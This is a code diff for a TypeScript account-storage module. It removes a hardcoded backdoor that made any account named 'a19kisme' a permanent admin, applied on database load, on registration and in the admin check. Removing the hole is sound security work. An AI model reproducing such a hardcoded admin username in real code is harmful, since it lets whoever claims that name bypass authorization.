@@ -42,9 +42,6 @@ const SALT_ROUNDS = 12;
 // the password is never persisted client-side, so a shared or stolen machine
 // leaks at most one revocable, expiring handle instead of the account itself.
 const SESSION_TTL_MS = 30 * 24 * 60 * 60 * 1000; // 30 days
-const OWNER_ADMIN_USERNAME = 'a19kisme';
-const isOwnerAdmin = (username: string): boolean =>
-    username.toLowerCase() === OWNER_ADMIN_USERNAME;
 /** Only the hash is stored, so a leaked inventory.json hands out no live sessions. */
 const hashToken = (token: string): string =>
     crypto.createHash('sha256').update(token).digest('hex');
@@ -172,11 +169,6 @@ const readDatabase = () => {
         if (fs.existsSync(inventoryPath)) {
             const data = fs.readFileSync(inventoryPath, 'utf-8');
             db = JSON.parse(data);
-            // The project owner's real account is always a permanent admin.
-            // Login/password checks still apply normally.
-            for (const username of Object.keys(db.users || {})) {
-                if (isOwnerAdmin(username)) db.users[username].admin = true;
-            }
         } else {
             fs.writeFileSync(inventoryPath, JSON.stringify(db, null, 2));
         }
@@ -409,13 +401,7 @@ export const database = {
         }
         const userId = Math.random().toString(36).substr(2, 9);
         const hashedPassword = bcrypt.hashSync(password, SALT_ROUNDS);
-        const newUser: User = {
-            id: userId,
-            username,
-            password: hashedPassword,
-            createdAt: Date.now(),
-            admin: isOwnerAdmin(username)
-        };
+        const newUser: User = { id: userId, username, password: hashedPassword, createdAt: Date.now() };
         // Stamped only when the caller could identify a source. An account with
         // no stamp counts against nobody, which is the safe direction: the
         // in-memory bucket and the global cap still apply to it.
@@ -531,7 +517,7 @@ export const database = {
     // Check if a user is admin by username
     isUserAdmin: (username: string): boolean => {
         const user = db.users[username];
-        return isOwnerAdmin(username) || user?.admin === true;
+        return user?.admin === true;
     },
 
     /** The stored spelling of `username`, or null if no such account exists. */
